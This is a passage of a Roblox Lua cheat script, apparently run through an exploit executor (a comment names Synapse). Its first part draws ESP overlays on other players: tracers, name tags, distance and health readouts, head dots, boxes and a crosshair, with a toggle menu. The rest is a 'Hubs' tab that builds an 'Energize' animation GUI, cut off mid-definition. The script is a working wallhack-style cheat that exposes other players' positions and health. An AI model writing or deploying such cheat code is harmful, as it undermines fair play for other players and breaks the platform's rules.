					local Color = Rainbow and Color3.fromHSV(tick() * 128 % 255/255, 1, 1) or (CheckTeam(v) and TeamColor or EnemyColor); Color = Options.ShowTeamColor.Value and v.TeamColor.Color or Color;
					local OPos = Camera.CFrame:pointToObjectSpace(Head.Position);
					
					if ScreenPosition.Z < 0 then
						local AT = math.atan2(OPos.Y, OPos.X) + math.pi;
						OPos = CFrame.Angles(0, 0, AT):vectorToWorldSpace((CFrame.Angles(0, math.rad(89.9), 0):vectorToWorldSpace(V3New(0, 0, -1))));
					end
					
					local Position = WorldToViewport(Camera.CFrame:pointToWorldSpace(OPos));

					if Options.ShowTracers.Value then
						if TracerPosition.X >= Camera.ViewportSize.X or TracerPosition.Y >= Camera.ViewportSize.Y or TracerPosition.X < 0 or TracerPosition.Y < 0 then
							TracerPosition = V2New(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y - 135);
						end

						Tracer.Visible	= true;
						Tracer.Transparency = math.clamp(1 - (Distance / 200), 0.25, 0.75);
						Tracer.From		= TracerPosition;
						Tracer.To		= V2New(Position.X, Position.Y);
						Tracer.Color	= Color;
						OutlineTracer.From = Tracer.From;
						OutlineTracer.To = Tracer.To;
						OutlineTracer.Transparency = Tracer.Transparency - 0.15;
						OutlineTracer.Visible = true;
					else
						Tracer.Visible = false;
						OutlineTracer.Visible = false;
					end
					
					if ScreenPosition.Z > 0 then
						local ScreenPositionUpper	= WorldToViewport((HumanoidRootPart:GetRenderCFrame() * CFrame.new(0, Head.Size.Y + HumanoidRootPart.Size.Y + (Options.YOffset.Value / 25), 0)).Position);
						local Scale					= Head.Size.Y / 2;

						if Options.ShowName.Value then
							NameTag.Visible		= true;
							NameTag.Text		= v.Name .. (CustomPlayerTag and CustomPlayerTag(v) or '');
							NameTag.Size		= Options.TextSize.Value;
							NameTag.Outline		= Options.TextOutline.Value;
							NameTag.Position	= V2New(ScreenPositionUpper.X, ScreenPositionUpper.Y) - V2New(0, NameTag.TextBounds.Y);
							NameTag.Color		= Color;
							NameTag.Color		= Color;
							NameTag.OutlineColor= Color3.new(0.05, 0.05, 0.05);
							NameTag.Transparency= 0.85;
							if Drawing.Fonts and shared.am_ic3 then -- CURRENTLY SYNAPSE ONLY :MEGAHOLY:
								NameTag.Font	= Drawing.Fonts.Monospace;
							end
						else
							NameTag.Visible = false;
						end
						if Options.ShowDistance.Value or Options.ShowHealth.Value then
							DistanceTag.Visible		= true;
							DistanceTag.Size		= Options.TextSize.Value - 1;
							DistanceTag.Outline		= Options.TextOutline.Value;
							DistanceTag.Color		= Color3.new(1, 1, 1);
							DistanceTag.Transparency= 0.85;
							if Drawing.Fonts and shared.am_ic3 then -- CURRENTLY SYNAPSE ONLY :MEGAHOLY:
								NameTag.Font	= Drawing.Fonts.Monospace;
							end

							local Str = '';

							if Options.ShowDistance.Value then
								Str = Str .. Format('[%d] ', Distance);
							end
							if Options.ShowHealth.Value then								
								if typeof(Humanoid) == 'Instance' then
									Str = Str .. Format('[%d/%d] [%s%%]', Humanoid.Health, Humanoid.MaxHealth, math.floor(Humanoid.Health / Humanoid.MaxHealth * 100));
								elseif type(GetHealth) == 'function' then
									local health, maxHealth = GetHealth(v)
									
									if type(health) == 'number' and type(maxHealth) == 'number' then
										Str = Str .. Format('[%d/%d] [%s%%]', health, maxHealth, math.floor(health / maxHealth * 100))
									end
								end
							end

							DistanceTag.Text = Str;
							DistanceTag.OutlineColor = Color3.new(0.05, 0.05, 0.05);
							DistanceTag.Position = (NameTag.Visible and NameTag.Position + V2New(0, NameTag.TextBounds.Y) or V2New(ScreenPositionUpper.X, ScreenPositionUpper.Y));
						else
							DistanceTag.Visible = false;
						end
						if Options.ShowDot.Value and Vis then
							local Top			= WorldToViewport((Head.CFrame * CFrame.new(0, Scale, 0)).Position);
							local Bottom		= WorldToViewport((Head.CFrame * CFrame.new(0, -Scale, 0)).Position);
							local Radius		= (Top - Bottom).y;

							HeadDot.Visible		= true;
							HeadDot.Color		= Color;
							HeadDot.Position	= V2New(ScreenPosition.X, ScreenPosition.Y);
							HeadDot.Radius		= Radius;
						else
							HeadDot.Visible = false;
						end
						if Options.ShowBoxes.Value and Vis and HumanoidRootPart then
							local Body = {
								Head;
								Character:FindFirstChild'Left Leg' or Character:FindFirstChild'LeftLowerLeg';
								Character:FindFirstChild'Right Leg' or Character:FindFirstChild'RightLowerLeg';
								Character:FindFirstChild'Left Arm' or Character:FindFirstChild'LeftLowerArm';
								Character:FindFirstChild'Right Arm' or Character:FindFirstChild'RightLowerArm';
							}
							Box:Update(HumanoidRootPart.CFrame, V3New(2, 3, 1) * (Scale * 2), Color, nil, shared.am_ic3 and Body);
						else
							Box:SetVisible(false);
						end
					else
						NameTag.Visible			= false;
						DistanceTag.Visible		= false;
						HeadDot.Visible			= false;
						
						Box:SetVisible(false);
					end
				else
					NameTag.Visible			= false;
					DistanceTag.Visible		= false;
					HeadDot.Visible			= false;
					Tracer.Visible			= false;
					OutlineTracer.Visible 	= false;
					
					Box:SetVisible(false);
				end
			else
				NameTag.Visible			= false;
				DistanceTag.Visible		= false;
				HeadDot.Visible			= false;
				Tracer.Visible			= false;
				OutlineTracer.Visible 	= false;

				Box:SetVisible(false);
			end

			shared.InstanceData[v.Name] = Data;
		end
	end
end

local LastInvalidCheck = 0;

local function Update()
	if tick() - LastInvalidCheck > 0.3 then
		LastInvalidCheck = tick();

		if Camera.Parent ~= workspace then
			Camera = workspace.CurrentCamera;
			CameraCon();
			WTVP = Camera.WorldToViewportPoint;
		end

		for i, v in pairs(shared.InstanceData) do
			if not Players:FindFirstChild(tostring(i)) then
				if not shared.InstanceData[i].DontDelete then
					GetTableData(v.Instances)(function(i, obj)
						obj.Visible = false;
						obj:Remove();
						v.Instances[i] = nil;
					end)
					shared.InstanceData[i] = nil;
				else
					if shared.InstanceData[i].Instance == nil or shared.InstanceData[i].Instance.Parent == nil then
						GetTableData(v.Instances)(function(i, obj)
							obj.Visible = false;
							obj:Remove();
							v.Instances[i] = nil;
						end)
						shared.InstanceData[i] = nil;
					end
				end
			end
		end
	end

	local CX = Menu:GetInstance'CrosshairX';
	local CY = Menu:GetInstance'CrosshairY';
	
	if Options.Crosshair.Value then
		CX.Visible = true;
		CY.Visible = true;

		CX.To = V2New((Camera.ViewportSize.X / 2) - 8, (Camera.ViewportSize.Y / 2));
		CX.From = V2New((Camera.ViewportSize.X / 2) + 8, (Camera.ViewportSize.Y / 2));
		CY.To = V2New((Camera.ViewportSize.X / 2), (Camera.ViewportSize.Y / 2) - 8);
		CY.From = V2New((Camera.ViewportSize.X / 2), (Camera.ViewportSize.Y / 2) + 8);
	else
		CX.Visible = false;
		CY.Visible = false;
	end

	if Options.MenuOpen.Value and MenuLoaded then
		local MLocation = GetMouseLocation();
		shared.MenuDrawingData.Instances.Main.Color = Color3.fromHSV(tick() * 24 % 255/255, 1, 1);
		local MainInstance = Menu:GetInstance'Main';
		
		local Values = {
			MainInstance.Position.X;
			MainInstance.Position.Y;
			MainInstance.Position.X + MainInstance.Size.X;
			MainInstance.Position.Y + MainInstance.Size.Y;
		};
		
		if MainInstance and (MouseHoveringOver(Values) or (SubMenu.Open and MouseHoveringOver(SubMenu.Bounds))) then
			Debounce.CursorVis = true;
			
			Menu:UpdateMenuInstance'Cursor1'{
				Visible	= true;
				From	= V2New(MLocation.x, MLocation.y);
				To		= V2New(MLocation.x + 5, MLocation.y + 6);
			}
			Menu:UpdateMenuInstance'Cursor2'{
				Visible	= true;
				From	= V2New(MLocation.x, MLocation.y);
				To		= V2New(MLocation.x, MLocation.y + 8);
			}
			Menu:UpdateMenuInstance'Cursor3'{
				Visible	= true;
				From	= V2New(MLocation.x, MLocation.y + 6);
				To		= V2New(MLocation.x + 5, MLocation.y + 5);
			}
		else
			if Debounce.CursorVis then
				Debounce.CursorVis = false;
				
				Menu:UpdateMenuInstance'Cursor1'{Visible = false};
				Menu:UpdateMenuInstance'Cursor2'{Visible = false};
				Menu:UpdateMenuInstance'Cursor3'{Visible = false};
			end
		end
		if MouseHeld then
			local MousePos = GetMouseLocation();

			if Dragging then
				DraggingWhat.Slider.Position = V2New(math.clamp(MLocation.X - DraggingWhat.Slider.Size.X / 2, DraggingWhat.Line.Position.X, DraggingWhat.Line.Position.X + DraggingWhat.Line.Size.X - DraggingWhat.Slider.Size.X), DraggingWhat.Slider.Position.Y);
				local Percent	= (DraggingWhat.Slider.Position.X - DraggingWhat.Line.Position.X) / ((DraggingWhat.Line.Position.X + DraggingWhat.Line.Size.X - DraggingWhat.Line.Position.X) - DraggingWhat.Slider.Size.X);
				local Value		= CalculateValue(DraggingWhat.Min, DraggingWhat.Max, Percent);
				DraggingWhat.Option(Value);
			elseif DraggingUI then
				Debounce.UIDrag = true;
				local Main = Menu:GetInstance'Main';
				Main.Position = MousePos + DragOffset;
			elseif DragTracerPosition then
				TracerPosition = MousePos;
			end
		else
			Dragging = false;
			DragTracerPosition = false;
			if DraggingUI and Debounce.UIDrag then
				Debounce.UIDrag = false;
				DraggingUI = false;
				CreateMenu(Menu:GetInstance'Main'.Position);
			end
		end
		if not Debounce.Menu then
			Debounce.Menu = true;
			ToggleMenu();
		end
	elseif Debounce.Menu and not Options.MenuOpen.Value then
		Debounce.Menu = false;
		ToggleMenu();
	end
end

RunService:UnbindFromRenderStep(GetDataName);
RunService:UnbindFromRenderStep(UpdateName);

RunService:BindToRenderStep(GetDataName, 300, UpdatePlayerData);
RunService:BindToRenderStep(UpdateName, 199, Update);
end)



--Hubs Section

local Player = Window:NewTab("Hubs")
local AnimationsSection = Player:NewSection("Animations")

AnimationsSection:NewButton("Energize UI", "Loads the Energize Animations UI", function()
    -- Energize by illremember, fe animations
-- DO NOT COPY AND CLAIM AS OWN, if you are using some of the script for your own, credit is highly appreciated!
-- Thank you, and enjoy.
 
-- Objects
 
local Energize = Instance.new("ScreenGui") -- The actual GUI
local SideFrame = Instance.new("Frame") -- Visible when GUI is closed
local OpenGUI = Instance.new("TextButton") -- Part of SideFrame
local SideFrameTitle = Instance.new("TextLabel") -- Part of SideFrame
local MainFrame = Instance.new("Frame") -- All of the stuff on the main frame
local GuiBottomFrame = Instance.new("Frame") -- Part of Active Frame
local Credits = Instance.new("TextLabel") -- Credits to illremember, hello there
local ScrollingFrame = Instance.new("ScrollingFrame") -- The scrolling frame of animations
local CheckR = Instance.new("TextLabel") -- Check if R15 or R6
local ScrollingFrameR15 = Instance.new("ScrollingFrame") -- The scrolling frame of R15 animations
 
local CrazySlash = Instance.new("TextButton")--COMPLETE
local Open = Instance.new("TextButton")--COMPLETE
local R15Spinner = Instance.new("TextButton")--COMPLETE
local ArmsOut = Instance.new("TextButton")--COMPLETE
local FloatSlash = Instance.new("TextButton")--COMPLETE
local WeirdZombie = Instance.new("TextButton")--COMPLETE
local DownSlash = Instance.new("TextButton")--COMPLETE
local Pull = Instance.new("TextButton")--COMPLETE
local CircleArm = Instance.new("TextButton")--COMPLETE
local Bend = Instance.new("TextButton")--COMPLETE
local RotateSlash = Instance.new("TextButton")--COMPLETE
local FlingArms = Instance.new("TextButton")--COMPLETE
 
local FullSwing = Instance.new("TextButton")--COMPLETE
local GlitchLevitate = Instance.new("TextButton")--COMPLETE
local MoonDance = Instance.new("TextButton")--COMPLETE
local FullPunch = Instance.new("TextButton")--COMPLETE
local Crouch = Instance.new("TextButton")--COMPLETE
local SpinDance = Instance.new("TextButton")--COMPLETE
local FloorFaint = Instance.new("TextButton")--COMPLETE
local JumpingJacks = Instance.new("TextButton")--COMPLETE
local Spinner = Instance.new("TextButton")--COMPLETE
local MegaInsane = Instance.new("TextButton")--COMPLETE
local ArmDetach = Instance.new("TextButton")--COMPLETE
local WeirdMove = Instance.new("TextButton")--COMPLETE
local Faint = Instance.new("TextButton")--COMPLETE
local CloneIllusion = Instance.new("TextButton")--COMPLETE
local Levitate = Instance.new("TextButton")--COMPLETE
local DinoWalk = Instance.new("TextButton")--COMPLETE
local FloorCrawl = Instance.new("TextButton")--COMPLETE
local SwordSlam = Instance.new("TextButton")--COMPLETE
local LoopHead = Instance.new("TextButton")--COMPLETE
local HeroJump = Instance.new("TextButton")--COMPLETE
local Insane = Instance.new("TextButton")--COMPLETE
local FloatingHead = Instance.new("TextButton")--COMPLETE
local HeadThrow = Instance.new("TextButton")--COMPLETE
local MovingDance = Instance.new("TextButton")--COMPLETE
local SuperPunch = Instance.new("TextButton")--COMPLETE
local ArmTurbine = Instance.new("TextButton")--COMPLETE
local Dab = Instance.new("TextButton")--COMPLETE
local FloatSit = Instance.new("TextButton")--COMPLETE
local SuperFaint = Instance.new("TextButton")--COMPLETE
local BarrelRoll = Instance.new("TextButton")--COMPLETE
local Scared = Instance.new("TextButton")--COMPLETE
local InsaneArms = Instance.new("TextButton")--COMPLETE
local SwordSlice = Instance.new("TextButton")--COMPLETE
local SpinDance2 = Instance.new("TextButton")--COMPLETE
local BowDown = Instance.new("TextButton")--COMPLETE
local LoopSlam = Instance.new("TextButton")--COMPLETE
 
local GuiTopFrame = Instance.new("Frame") -- Top of the main frame
local CloseGUI = Instance.new("TextButton") -- To close the GUI
local Title = Instance.new("TextLabel") -- Actual title of GUI, Energize
 
-- Properties
 
Energize.Name = "Energize"
Energize.Parent = game.Players.LocalPlayer.PlayerGui
 
SideFrame.Name = "SideFrame"
SideFrame.Parent = Energize
SideFrame.Active = true
SideFrame.BackgroundColor3 = Color3.new(1, 0.329412, 0.329412)
SideFrame.Draggable = true
SideFrame.Position = UDim2.new(0, 376, 0, 125)
SideFrame.Size = UDim2.new(0, 460, 0, 32)
SideFrame.Visible = false
 
OpenGUI.Name = "OpenGUI"
OpenGUI.Parent = SideFrame
OpenGUI.BackgroundColor3 = Color3.new(1, 1, 1)
OpenGUI.BackgroundTransparency = 1
OpenGUI.Position = UDim2.new(0, 426, 0, 0)
OpenGUI.Size = UDim2.new(0, 34, 0, 32)
OpenGUI.Font = Enum.Font.SourceSans
OpenGUI.FontSize = Enum.FontSize.Size48
OpenGUI.Text = "X"
OpenGUI.TextColor3 = Color3.new(0.333333, 0, 0)
OpenGUI.TextSize = 40
OpenGUI.TextWrapped = true
 
SideFrameTitle.Name = "SideFrameTitle"
SideFrameTitle.Parent = SideFrame
SideFrameTitle.BackgroundColor3 = Color3.new(1, 1, 1)
SideFrameTitle.BackgroundTransparency = 1
SideFrameTitle.Position = UDim2.new(0, 170, 0, 0)
SideFrameTitle.Size = UDim2.new(0, 119, 0, 31)
SideFrameTitle.Font = Enum.Font.Arial
SideFrameTitle.FontSize = Enum.FontSize.Size24
SideFrameTitle.Text = "Energize"
SideFrameTitle.TextSize = 21
SideFrameTitle.TextStrokeColor3 = Color3.new(0.27451, 0.92549, 0.905882)
SideFrameTitle.TextStrokeTransparency = 0.69999998807907
 
MainFrame.Name = "MainFrame"
MainFrame.Parent = Energize
MainFrame.Active = true
MainFrame.BackgroundColor3 = Color3.new(1, 1, 1)
MainFrame.BackgroundTransparency = 1
MainFrame.Draggable = true
MainFrame.Position = UDim2.new(0, 376, 0, 125)
MainFrame.Size = UDim2.new(0, 444, 0, 280)
 
GuiBottomFrame.Name = "Gui BottomFrame"
GuiBottomFrame.Parent = MainFrame
GuiBottomFrame.BackgroundColor3 = Color3.new(1, 0.329412, 0.329412)
GuiBottomFrame.BorderColor3 = Color3.new(0.243137, 0.243137, 0.243137)
GuiBottomFrame.Position = UDim2.new(0, 0, 0, 247)
GuiBottomFrame.Size = UDim2.new(0, 460, 0, 32)
 
Credits.Name = "Credits"
Credits.Parent = GuiBottomFrame
Credits.BackgroundColor3 = Color3.new(1, 1, 1)
Credits.BackgroundTransparency = 1
Credits.Size = UDim2.new(0, 460, 0, 32)
Credits.FontSize = Enum.FontSize.Size14
Credits.Text = "By illremember FE Animations Gui"
Credits.TextColor3 = Color3.new(0.219608, 0.219608, 0.219608)
Credits.TextSize = 14
Credits.TextStrokeColor3 = Color3.new(0.141176, 0.870588, 0.713726)
Credits.TextStrokeTransparency = 0.69999998807907
Credits.TextWrapped = true
 
ScrollingFrame.Parent = MainFrame
ScrollingFrame.BackgroundColor3 = Color3.new(1, 0.564706, 0.564706)
ScrollingFrame.Position = UDim2.new(0, 0, 0, 32)
ScrollingFrame.Size = UDim2.new(0, 460, 0, 215)
ScrollingFrame.ScrollBarThickness = 13
 
FullSwing.Name = "FullSwing"
FullSwing.Parent = ScrollingFrame
FullSwing.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
FullSwing.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
FullSwing.Position = UDim2.new(0, 17, 0, 322)
FullSwing.Size = UDim2.new(0, 119, 0, 34)
FullSwing.Font = Enum.Font.Highway
FullSwing.FontSize = Enum.FontSize.Size24
FullSwing.Text = "Full Swing"
FullSwing.TextSize = 20
FullSwing.TextWrapped = true
 
GlitchLevitate.Name = "GlitchLevitate"
GlitchLevitate.Parent = ScrollingFrame
GlitchLevitate.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
GlitchLevitate.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
GlitchLevitate.Position = UDim2.new(0, 319, 0, 322)
GlitchLevitate.Size = UDim2.new(0, 119, 0, 34)
GlitchLevitate.Font = Enum.Font.Highway
GlitchLevitate.FontSize = Enum.FontSize.Size24
GlitchLevitate.Text = "Glitch Levitate"
GlitchLevitate.TextSize = 20
GlitchLevitate.TextWrapped = true
 
MoonDance.Name = "MoonDance"
MoonDance.Parent = ScrollingFrame
MoonDance.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
MoonDance.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
MoonDance.Position = UDim2.new(0, 319, 0, 280)
MoonDance.Size = UDim2.new(0, 119, 0, 34)
MoonDance.Font = Enum.Font.Highway
MoonDance.FontSize = Enum.FontSize.Size24
MoonDance.Text = "Moon Dance"
MoonDance.TextSize = 20
MoonDance.TextWrapped = true
 
FullPunch.Name = "FullPunch"
FullPunch.Parent = ScrollingFrame
FullPunch.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
FullPunch.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
FullPunch.Position = UDim2.new(0, 17, 0, 280)
FullPunch.Size = UDim2.new(0, 119, 0, 34)
FullPunch.Font = Enum.Font.Highway
FullPunch.FontSize = Enum.FontSize.Size24
FullPunch.Text = "Full Punch"
FullPunch.TextSize = 20
FullPunch.TextWrapped = true
 
Crouch.Name = "Crouch"
Crouch.Parent = ScrollingFrame
Crouch.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
Crouch.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
Crouch.Position = UDim2.new(0, 168, 0, 280)
Crouch.Size = UDim2.new(0, 119, 0, 34)
Crouch.Font = Enum.Font.Highway
Crouch.FontSize = Enum.FontSize.Size24
Crouch.Text = "Crouch"
Crouch.TextSize = 20
Crouch.TextWrapped = true
 
SpinDance.Name = "SpinDance"
SpinDance.Parent = ScrollingFrame
SpinDance.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
SpinDance.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
SpinDance.Position = UDim2.new(0, 168, 0, 236)
SpinDance.Size = UDim2.new(0, 119, 0, 34)
SpinDance.Font = Enum.Font.Highway
SpinDance.FontSize = Enum.FontSize.Size24
SpinDance.Text = "Spin Dance"
SpinDance.TextSize = 20
SpinDance.TextWrapped = true
 
FloorFaint.Name = "FloorFaint"
FloorFaint.Parent = ScrollingFrame
FloorFaint.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
FloorFaint.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
FloorFaint.Position = UDim2.new(0, 17, 0, 236)
FloorFaint.Size = UDim2.new(0, 119, 0, 34)
FloorFaint.Font = Enum.Font.Highway
FloorFaint.FontSize = Enum.FontSize.Size24
FloorFaint.Text = "Floor Faint"
FloorFaint.TextSize = 20
FloorFaint.TextWrapped = true
 
JumpingJacks.Name = "JumpingJacks"
JumpingJacks.Parent = ScrollingFrame
JumpingJacks.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
JumpingJacks.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
JumpingJacks.Position = UDim2.new(0, 319, 0, 236)
JumpingJacks.Size = UDim2.new(0, 119, 0, 34)
JumpingJacks.Font = Enum.Font.Highway
JumpingJacks.FontSize = Enum.FontSize.Size24
JumpingJacks.Text = "Jumping Jacks"
JumpingJacks.TextSize = 20
JumpingJacks.TextWrapped = true
 
Spinner.Name = "Spinner"
Spinner.Parent = ScrollingFrame
Spinner.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
Spinner.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
Spinner.Position = UDim2.new(0, 17, 0, 192)
Spinner.Size = UDim2.new(0, 119, 0, 34)
Spinner.Font = Enum.Font.Highway
Spinner.FontSize = Enum.FontSize.Size24
Spinner.Text = "Spinner"
Spinner.TextSize = 20
Spinner.TextWrapped = true
 
MegaInsane.Name = "MegaInsane"
MegaInsane.Parent = ScrollingFrame
MegaInsane.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
MegaInsane.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
MegaInsane.Position = UDim2.new(0, 168, 0, 192)
MegaInsane.Size = UDim2.new(0, 119, 0, 34)
MegaInsane.Font = Enum.Font.Highway
MegaInsane.FontSize = Enum.FontSize.Size24
MegaInsane.Text = "Mega Insane"
MegaInsane.TextSize = 20
MegaInsane.TextWrapped = true
 
ArmDetach.Name = "ArmDetach"
ArmDetach.Parent = ScrollingFrame
ArmDetach.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
ArmDetach.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
ArmDetach.Position = UDim2.new(0, 319, 0, 192)
ArmDetach.Size = UDim2.new(0, 119, 0, 34)
ArmDetach.Font = Enum.Font.Highway
ArmDetach.FontSize = Enum.FontSize.Size24
ArmDetach.Text = "Arm Detach"
ArmDetach.TextSize = 20
ArmDetach.TextWrapped = true
 
WeirdMove.Name = "WeirdMove"
WeirdMove.Parent = ScrollingFrame
WeirdMove.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
WeirdMove.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
WeirdMove.Position = UDim2.new(0, 168, 0, 148)
WeirdMove.Size = UDim2.new(0, 119, 0, 34)
WeirdMove.Font = Enum.Font.Highway
WeirdMove.FontSize = Enum.FontSize.Size24
WeirdMove.Text = "Weird Move"
WeirdMove.TextSize = 20
WeirdMove.TextWrapped = true
 
Faint.Name = "Faint"
Faint.Parent = ScrollingFrame
Faint.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
Faint.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
Faint.Position = UDim2.new(0, 17, 0, 148)
Faint.Size = UDim2.new(0, 119, 0, 34)
Faint.Font = Enum.Font.Highway
Faint.FontSize = Enum.FontSize.Size24
Faint.Text = "Faint"
Faint.TextSize = 20
Faint.TextWrapped = true
 
CloneIllusion.Name = "CloneIllusion"
CloneIllusion.Parent = ScrollingFrame
CloneIllusion.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
CloneIllusion.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
CloneIllusion.Position = UDim2.new(0, 319, 0, 148)
CloneIllusion.Size = UDim2.new(0, 119, 0, 34)
CloneIllusion.Font = Enum.Font.Highway
CloneIllusion.FontSize = Enum.FontSize.Size24
CloneIllusion.Text = "Clone Illusion"
CloneIllusion.TextSize = 20
CloneIllusion.TextWrapped = true
 
Levitate.Name = "Levitate"
Levitate.Parent = ScrollingFrame
Levitate.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
Levitate.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
Levitate.Position = UDim2.new(0, 17, 0, 104)
Levitate.Size = UDim2.new(0, 119, 0, 34)
Levitate.Font = Enum.Font.Highway
Levitate.FontSize = Enum.FontSize.Size24
Levitate.Text = "Levitate"
Levitate.TextSize = 20
Levitate.TextWrapped = true
 
DinoWalk.Name = "DinoWalk"
DinoWalk.Parent = ScrollingFrame
DinoWalk.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
DinoWalk.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
DinoWalk.Position = UDim2.new(0, 168, 0, 104)
DinoWalk.Size = UDim2.new(0, 119, 0, 34)
DinoWalk.Font = Enum.Font.Highway
DinoWalk.FontSize = Enum.FontSize.Size24
DinoWalk.Text = "Dino Walk"
DinoWalk.TextSize = 20
DinoWalk.TextWrapped = true
 
FloorCrawl.Name = "FloorCrawl"
FloorCrawl.Parent = ScrollingFrame
FloorCrawl.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
FloorCrawl.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
FloorCrawl.Position = UDim2.new(0, 319, 0, 104)
FloorCrawl.Size = UDim2.new(0, 119, 0, 34)
FloorCrawl.Font = Enum.Font.Highway
FloorCrawl.FontSize = Enum.FontSize.Size24
FloorCrawl.Text = "Floor Crawl"
FloorCrawl.TextSize = 20
FloorCrawl.TextWrapped = true
 
SwordSlam.Name = "SwordSlam"
SwordSlam.Parent = ScrollingFrame
SwordSlam.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
SwordSlam.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
SwordSlam.Position = UDim2.new(0, 319, 0, 60)
SwordSlam.Size = UDim2.new(0, 119, 0, 34)
SwordSlam.Font = Enum.Font.Highway
SwordSlam.FontSize = Enum.FontSize.Size24
SwordSlam.Text = "Sword Slam"
SwordSlam.TextSize = 20
SwordSlam.TextWrapped = true
 
LoopHead.Name = "LoopHead"
LoopHead.Parent = ScrollingFrame
LoopHead.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
LoopHead.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
LoopHead.Position = UDim2.new(0, 168, 0, 60)
LoopHead.Size = UDim2.new(0, 119, 0, 34)
LoopHead.Font = Enum.Font.Highway
LoopHead.FontSize = Enum.FontSize.Size24
LoopHead.Text = "Loop Head"
LoopHead.TextSize = 20
LoopHead.TextWrapped = true
 
HeroJump.Name = "HeroJump"
HeroJump.Parent = ScrollingFrame
HeroJump.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
HeroJump.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
HeroJump.Position = UDim2.new(0, 17, 0, 60)
HeroJump.Size = UDim2.new(0, 119, 0, 34)
HeroJump.Font = Enum.Font.Highway
HeroJump.FontSize = Enum.FontSize.Size24
HeroJump.Text = "Hero Jump"
HeroJump.TextSize = 20
HeroJump.TextWrapped = true
 
Insane.Name = "Insane"
Insane.Parent = ScrollingFrame
Insane.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
Insane.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
Insane.Position = UDim2.new(0, 319, 0, 16)
Insane.Size = UDim2.new(0, 119, 0, 34)
Insane.Font = Enum.Font.Highway
Insane.FontSize = Enum.FontSize.Size24
Insane.Text = "Insane"
Insane.TextSize = 20
Insane.TextWrapped = true
 
FloatingHead.Name = "FloatingHead"
FloatingHead.Parent = ScrollingFrame
FloatingHead.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
FloatingHead.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
FloatingHead.Position = UDim2.new(0, 168, 0, 16)
FloatingHead.Size = UDim2.new(0, 119, 0, 34)
FloatingHead.Font = Enum.Font.Highway
FloatingHead.FontSize = Enum.FontSize.Size24
FloatingHead.Text = "Floating Head"
FloatingHead.TextSize = 20
FloatingHead.TextWrapped = true
 
HeadThrow.Name = "HeadThrow"
HeadThrow.Parent = ScrollingFrame
HeadThrow.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
HeadThrow.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
HeadThrow.Position = UDim2.new(0, 17, 0, 16)
HeadThrow.Size = UDim2.new(0, 119, 0, 34)
HeadThrow.Font = Enum.Font.Highway
HeadThrow.FontSize = Enum.FontSize.Size24
HeadThrow.Text = "Head Throw"
HeadThrow.TextSize = 20
HeadThrow.TextWrapped = true
 
MovingDance.Name = "MovingDance"
MovingDance.Parent = ScrollingFrame
MovingDance.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
MovingDance.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
MovingDance.Position = UDim2.new(0, 168, 0, 324)
MovingDance.Size = UDim2.new(0, 119, 0, 34)
MovingDance.Font = Enum.Font.Highway
MovingDance.FontSize = Enum.FontSize.Size24
MovingDance.Text = "Moving Dance"
MovingDance.TextSize = 20
MovingDance.TextWrapped = true
 
SuperPunch.Name = "SuperPunch"
SuperPunch.Parent = ScrollingFrame
SuperPunch.BackgroundColor3 = Color3.new(0.886275, 0.776471, 0.368627)
SuperPunch.BorderColor3 = Color3.new(0.313726, 0.313726, 0.313726)
SuperPunch.Position = UDim2.new(0, 168, 0, 366)
SuperPunch.Size = UDim2.new(0, 119, 0, 34)
SuperPunch.Font = Enum.Font.Highway
SuperPunch.FontSize = Enum.FontSize.Size24
SuperPunch.Text = "Super Punch"
SuperPunch.TextSize = 20
SuperPunch.TextWrapped = true
 
ArmTurbine.Name = "ArmTurbine"
ArmTurbine.Parent = ScrollingFrame
